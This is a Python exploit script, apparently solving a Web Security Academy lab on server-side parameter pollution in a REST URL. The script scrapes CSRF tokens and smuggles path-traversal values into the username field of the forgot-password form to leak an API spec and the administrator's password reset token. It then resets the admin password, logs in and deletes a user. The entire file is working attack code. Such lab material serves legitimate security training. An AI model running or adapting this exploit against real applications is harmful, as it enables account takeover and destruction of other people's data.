import secrets
import sys
import requests
import urllib3
from bs4 import BeautifulSoup

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy settings for debugging/interception
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Lab: Exploiting server-side parameter pollution in a REST URL
def extract_reset_token(target_host, session):
    try:
        # Step 1: Extract CSRF token from the password reset page
        url = f"https://{target_host}/forgot-password"
        response_csrf = session.get(url, verify=False)

        # Check if the host is responding
        if response_csrf.status_code == 504:
            print("(!) Host down.")
            sys.exit(-1)

        # Parse the CSRF token from the response HTML
        soup = BeautifulSoup(response_csrf.text, "html.parser")
        csrf = soup.find("input", {"name": "csrf"})["value"]

        # Step 2: Send password reset request for administrator
        data_reset_password = {"csrf": csrf, "username": "administrator"}
        response_reset_password = session.post(
            url, verify=False, data=data_reset_password, proxies=proxies
        )

        if response_reset_password.status_code == 200:
            print("(+) Administrator password reset token sent.")

            # Step 3: Leak internal path using parameter pollution technique
            data_reset_openapi_file = {
                "csrf": csrf,
                "username": "../../../../openapi.json%23",
            }
            response_reset_openapi_file = session.post(
                url, verify=False, data=data_reset_openapi_file, proxies=proxies
            )
            print("(+) Content of the file openapi.json:")
            print(response_reset_openapi_file.text)

            # Extract and return the reset token from the JSON response
            data_reset_token = {
                "csrf": csrf,
                "username": "../../v1/users/administrator/field/passwordResetToken%23",
            }
            response_reset_token = session.post(
                url, verify=False, data=data_reset_token, proxies=proxies
            )

            try:
                reset_token = response_reset_token.json()["result"]
                print(f"(+) Reset token: {reset_token}")
                return reset_token
            except (KeyError, ValueError):
                print("(!) Failed to extract reset token.")
                sys.exit()

        else:
            print("(!) Error during password reset.")
            sys.exit()

    except Exception as err:
        print(f"(!) {err}")
        sys.exit()


def reset_password(target_host, session, reset_token):
    # Step 4: Use the extracted reset token to set a new administrator password
    url = f"https://{target_host}/forgot-password?passwordResetToken={reset_token}"
    response_csrf = session.get(url, verify=False)

    # Parse CSRF token required for setting a new password
    soup = BeautifulSoup(response_csrf.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]

    # Generate a new secure random password
    password = secrets.token_hex(8)
    data = {
        "csrf": csrf,
        "passwordResetToken": reset_token,
        "new-password-1": password,
        "new-password-2": password,
    }

    # Submit the new password
    response_new_password = session.post(
        url, verify=False, data=data, allow_redirects=False, proxies=proxies
    )

    if response_new_password.status_code == 302:
        print("(+) New password set successfully.")
        print(f"(+) Password: {password}")
        return password
    else:
        print("(!) Error while setting new password.")
        sys.exit()


def ServerSide_parameter_pollution_Rest_url(target_host, session, new_password):
    # Step 5: Log in to the administrator account using the new password
    url = f"https://{target_host}/login"
    response_csrf = session.get(url, verify=False)

    # Parse CSRF token for authentication
    soup = BeautifulSoup(response_csrf.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]

    # Submit login credentials
    data = {"csrf": csrf, "username": "administrator", "password": new_password}
    login_response = session.post(url, data=data, verify=False, allow_redirects=False)

    if login_response.status_code == 302:
        print("(+) Logged in successfully as administrator.")
        administrator_session = login_response.cookies.values()[0]
        print(f"(+) Administrator Session: {administrator_session}")

        # Step 6: Delete user "carlos"
        print("(+) Deleting user carlos...")
        url_delete_user = f"https://{target_host}/admin/delete?username=carlos"

        response_delete_user = session.get(
            url_delete_user, verify=False, allow_redirects=False
        )

        if response_delete_user.status_code == 302:
            print("(+) User deleted successfully.")
            sys.exit()
        else:
            print("(!) Error while trying to delete user.")
            sys.exit()
    else:
        print("(!) Error while trying to log in.")
        sys.exit()


def main():
    if len(sys.argv) != 2:
        print(f"(!) Usage: {sys.argv[0]} <url>")
        print(
            f"(!) Example: {sys.argv[0]} xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net"
        )
        sys.exit()

    target_host = sys.argv[1]
    session = requests.session()

    # Extract reset token
    reset_token = extract_reset_token(target_host, session)

    # Reset password and obtain a new one
    new_password = reset_password(target_host, session, reset_token)

    # Login with new credentials and delete the user
    ServerSide_parameter_pollution_Rest_url(target_host, session, new_password)


if __name__ == "__main__":
    main()
